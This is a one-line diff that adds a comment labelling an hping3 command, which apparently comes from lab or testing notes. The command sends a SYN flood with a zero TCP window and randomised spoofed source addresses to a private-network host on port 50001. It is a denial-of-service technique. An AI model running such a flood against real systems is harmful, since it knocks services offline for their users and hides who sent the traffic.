@@ -1,1 +1,2 @@
+# TCP Window 0 (command)
 sudo hping3 -S 192.168.100.2 -p 50001 -w 0 --rand-source --flood
